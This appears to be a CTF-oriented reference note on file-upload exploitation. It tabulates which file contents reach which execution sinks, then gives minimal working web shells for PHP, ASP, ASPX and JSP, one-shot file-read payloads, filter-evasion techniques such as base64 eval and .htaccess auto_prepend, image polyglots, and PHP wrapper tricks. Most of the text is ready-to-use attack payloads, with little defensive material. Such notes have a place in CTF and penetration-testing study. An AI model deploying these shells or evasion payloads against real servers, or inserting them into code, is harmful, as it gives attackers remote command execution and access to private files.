# Payload Types — what goes inside the accepted file

## The taxonomy — the file's content answers "what does it do?"

Once an upload lands, the content picks the sink:

| Content | Sink | Result |
|---|---|---|
| `<?php system($_GET[0]);?>` | exec-mapped serve dir | web shell |
| `<?php echo file_get_contents('/flag');?>` | exec-mapped or include | flag read |
| `<script>...</script>` html | text/html serve | stored XSS |
| `xxe` entity xml | xml parser | file-read/OOB |
| pickle/serialize blob | `pickle.load`/`unserialize` | deser RCE |
| `#!/bin/sh` + commands | executed-as-script dir | shell |
| `GIF89a;<?php...` | polyglot ext | passes image check + php runs |
| traversal-named zip | extractor | write-anywhere |
| symlink zip entry | extractor | file-read/overwrite |
| `=cmd\|...` csv | spreadsheet | formula exec |
| `.. raw:: html` rst | doc renderer | XSS |
| `{"cmd":"..."}` json | json parser | depends |
| PE/ELF binary | executed as binary | shell |
| `<%eval request("x")%>` | ASP handler | web shell |
| `{{7*7}}` template text | ssti render | ssti |
| `\x89PNG...shell` | polyglot | passes magic + exec |

## The minimal shells per platform

```php
<?php system($_GET['c']); ?>                    # basic php
<?=`$_GET[c]`;?>                                # short tag + backticks
<?php echo shell_exec($_GET['c']); ?>
<?php passthru($_REQUEST[0]); ?>
<?php $x=$_GET['x'];`$x`;?>
```

```asp
<%eval request("x")%>
<%Response.Write(CreateObject("WScript.Shell").Exec(Request("c")).StdOut.ReadAll)%>
```

```aspx
<%@ Page%><%Response.Write(System.Diagnostics.Process.Start("cmd","/c "+Request["c"]).StandardOutput.ReadToEnd())%>
```

```jsp
<%= new java.util.Scanner(Runtime.getRuntime().exec(request.getParameter("c")).getInputStream()).useDelimiter("\\A").next() %>
```

```python
#!/usr/bin/env python3\nimport os;os.system('id')
```

## The "no shell needed" payloads — the file IS the flag-read

- `<?php echo file_get_contents('/flag');?>` — the file's purpose is one
  read — no interactive shell needed
- `<?php include '/flag';?>` — same
- `<%eval...%>` — one-shot
- a `.html` that `fetch('/flag')`s — reads server-side resources

A one-shot payload is often all a CTF needs — the persistent webshell is
the bonus.

## The obfuscation ladder — when filters catch `<?php`

- `<?=` (short echo) — same exec
- `<?php`+whitespace variants — `<?php\t`/`\n`
- hex/base64 encoding inside a wrapper — `eval(base64_decode(...))`
- `assert`/`create_function`/`call_user_func` indirection
- `$_GET[0]($_GET[1])` — param-driven function call
- `preg_replace` `/e` modifier — `preg_replace('/.*/e',$_GET['x'],'')`
- `.htaccess` `php_value auto_prepend_file` — run the shell as prepend
- `$_REQUEST`/`$_COOKIE`/`$_SERVER` for param diversity

## The "payload inside a valid container" — polyglot delivery

`GIF89a` header + `<?php ...` inside the image bytes — the image parses
AND the php runs — `polyglot-files.md`. The file's first bytes are the
format's magic; the payload hides in the tail/comments/EXIF.

## The "the payload doesn't need to be a file" — inline bodies

- `php://input` POST body itself (when auto_prepend'd)
- `data://text/plain;base64,...` via include
- `expect://id`/`zip://x.zip#y` wrapper — the file is a wrapper ref
- phar `phar://x.phar/y` — the payload inside a phar container

## The payload-size problem — big shells vs filters

A tiny `<?=` marker passes filters that catch full webshells — the
payload's size vs the filter's detection threshold. `webshell-advanced.md`
has the corpus.

## Falsifiers

- the file's content type allows nothing executable/interpreted to
  survive to a sink — plain text served as plain text

## Output to record

- the payload format the sink accepts + its minimal working form
